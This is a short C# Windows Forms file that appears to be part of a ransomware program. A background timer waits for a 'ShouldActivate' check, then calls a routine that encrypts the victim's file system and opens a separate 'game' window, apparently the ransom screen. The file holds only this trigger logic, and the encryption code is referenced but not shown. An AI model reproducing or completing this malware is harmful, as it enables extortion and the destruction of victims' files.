using System.Windows.Forms;
using Main.Tools;

namespace Main
{
    public partial class FormBackground : Form
    {
        public FormBackground()
        {
            InitializeComponent();
            
            timerActivateChecker.Interval = Config.TimerActivateCheckerInterval;
            timerActivateChecker.Enabled = true;
        }

        private void timerActivateChecker_Tick(object sender, System.EventArgs e)
        {
            if (Config.Activated) return;
            if (!Hacking.ShouldActivate()) return;

            Config.Activated = true;
            ImposeRestrictions();
            new FormGame().Show(this);
        }
        //luladasilva
        private static void ImposeRestrictions()
        {
            Locker.EncryptFileSystem();
        }
    }
}
